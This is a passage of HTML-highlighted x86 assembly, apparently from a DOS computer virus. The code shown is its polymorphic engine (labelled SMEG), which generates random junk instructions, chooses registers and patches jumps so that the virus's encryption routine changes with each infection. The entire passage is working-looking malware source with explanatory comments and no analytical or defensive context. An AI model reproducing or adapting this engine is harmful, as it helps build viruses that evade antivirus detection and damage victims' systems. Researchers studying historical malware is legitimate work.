        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">not_memory</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3h</span><span class="sc0">                   </span><span class="sc1">; using bx?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">not_BX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">                   </span><span class="sc1">; change it to di</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">not_memory</span><span class="sc0">
</span><span class="sc5">not_BX</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6h</span><span class="sc0">                   </span><span class="sc1">; is it si?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">       </span><span class="sc5">not_memory</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">                   </span><span class="sc1">; change it to double register</span><span class="sc0">
</span><span class="sc5">not_memory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fill_reg_reg1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; [reg], reg</span><span class="sc0">
</span><span class="sc5">fill_reg_field</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; fill bottom 3 bits only</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">fill_field</span><span class="sc0">
</span><span class="sc5">fill_mod_n_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">fill_mod_field</span><span class="sc0">          </span><span class="sc1">; fill mod field as usual</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                   </span><span class="sc1">; fill reg field with the</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">fill_reg_field</span><span class="sc0">    </span><span class="sc1">; register that holds the</span><span class="sc0">
</span><span class="sc5">fill_reg_reg2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">fill_field</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">fill_reg_reg1</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">encode_routine2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">which_tbl</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">encode_tbl1</span><span class="sc4">-</span><span class="sc2">6h</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">process_all</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                            </span><span class="sc1">; get a byte</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; are we at the end?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">      </span><span class="sc5">process_byte</span><span class="sc0">            </span><span class="sc1">; no, keep going</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                            </span><span class="sc1">; else get returncode and exit</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">process_byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">process_nibble</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">process_nibble</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">process_all</span><span class="sc0">
</span><span class="sc5">process_nibble</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; only use the part of</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">                  </span><span class="sc1">; the byte that we want</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">no_switch_table</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; if the lower half of byte=0,</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">switch_tables</span><span class="sc0">           </span><span class="sc1">; switch tables</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">loop_top</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">        </span><span class="sc1">; otherwise save this location</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">                             </span><span class="sc1">; as the top of the loop</span><span class="sc0">
</span><span class="sc5">switch_tables</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">which_tbl</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">encode_tbl2</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">no_switch_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">garble_more</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; calculate AX*6+ds:[which_tbl--virus]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">which_tbl</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">which_tbl</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">encode_tbl1</span><span class="sc4">-</span><span class="sc2">6h</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; dh holds first byte</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; ah holds second byte</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">encode_it</span><span class="sc0">               </span><span class="sc1">; process it</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                            </span><span class="sc1">; now ah holds the next byte</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">encode_it</span><span class="sc0">               </span><span class="sc1">; process it</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                            </span><span class="sc1">; get the next byte</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; it tells us which</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">                  </span><span class="sc1">; value to write in</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; this is the modifier</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">write_table</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; value, etc.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">write_nothing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">write_cryptval</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cryptval</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">write_pointer_patch</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">; save location of pointer initialisation</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">write_counter_patch</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">; save location of counter initialisation</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">counter_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">write_ptr_offset</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">; write XXXX of [bx+XXXX]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ptr_offsets</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">pointer_fixup</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">write_dl</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; write lower half of top</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; byte of dl as a word</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">; used as amount to increment</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">garble_some</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; garble 2-5 times</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">multiple_garble</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">garble_more</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">
</span><span class="sc5">multiple_garble</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_dx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">garble_again</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; save garble count</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">garble_once</span><span class="sc0">             </span><span class="sc1">; garble</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; restore garble count</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">garble_again</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cJMP_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">      </span><span class="sc1">; cJMP_patch == 0? i.e. is</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">       </span><span class="sc5">skip_finish_cJMP</span><span class="sc0">        </span><span class="sc1">; there an unfinished cJMP?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">finish_cJMP</span><span class="sc0">             </span><span class="sc1">; if so, finish it</span><span class="sc0">
</span><span class="sc5">skip_finish_cJMP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">many_nonbranch_garble</span><span class="sc0">   </span><span class="sc1">; garble garble</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nJMP_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; check if pending nJMP</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">loc_0047</span><span class="sc0">                </span><span class="sc1">; if so, keep going</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">loc_0047</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;  xref 4028:0996</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">                 </span><span class="sc1">; encode a RETN</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">CALL_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nJMP_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">many_nonbranch_garble</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">                 </span><span class="sc1">; do large instruction</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; garble from 3 to 6 times</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">many_nonbranch_garble_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">not_branch_garble</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">many_nonbranch_garble_loop</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc1">; finish_cJMP simply encodes a few instructions between the conditional</span><span class="sc0">
</span><span class="sc1">; jmp and its target, and then sets the destination of the jmp to be after</span><span class="sc0">
</span><span class="sc1">; the inserted instructions.</span><span class="sc0">
</span><span class="sc5">finish_cJMP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; get current location</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cJMP_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; get previous location</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc0">                      </span><span class="sc1">; calculate offset</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">go_patch_cJMP</span><span class="sc0">           </span><span class="sc1">; if nothing in between,</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">not_branch_garble</span><span class="sc0">       </span><span class="sc1">; fill in some instructions</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">finish_cJMP</span><span class="sc0">       </span><span class="sc1">; and do this again</span><span class="sc0">
</span><span class="sc5">go_patch_cJMP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">                  </span><span class="sc1">; are we close enough?</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">patch_cJMP</span><span class="sc0">              </span><span class="sc1">; if so, finish this now</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; if not, encode cJMP $+2</span><span class="sc0">
</span><span class="sc5">patch_cJMP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">; patch the cJMP destination</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cJMP_patch</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; clear usage flag</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">set_reg_mask</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc0">                  </span><span class="sc1">; clear bottom 3 bits</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">                    </span><span class="sc1">; assume one of 8 registers</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">                    </span><span class="sc1">; can we use any register?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">set_reg_mask_exit</span><span class="sc0">       </span><span class="sc1">; if so, quit</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">     </span><span class="sc1">; otherwise, set mask so we</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; only choose from regs 3-6</span><span class="sc0">
</span><span class="sc5">set_reg_mask_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴</span><span class="sc0">
</span><span class="sc5">choose_register</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">           </span><span class="sc1">; get random number</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">; clear high byte</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                   </span><span class="sc1">; use mask from set_reg_mask</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; get the register number</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; byte or word register?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">choose_reg_done</span><span class="sc0">         </span><span class="sc1">; if word, we are okay</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; otherwise, check if we can</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">choose_reg_done</span><span class="sc0">         </span><span class="sc1">; take only half the register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">; uh oh, we can't, so...</span><span class="sc0">
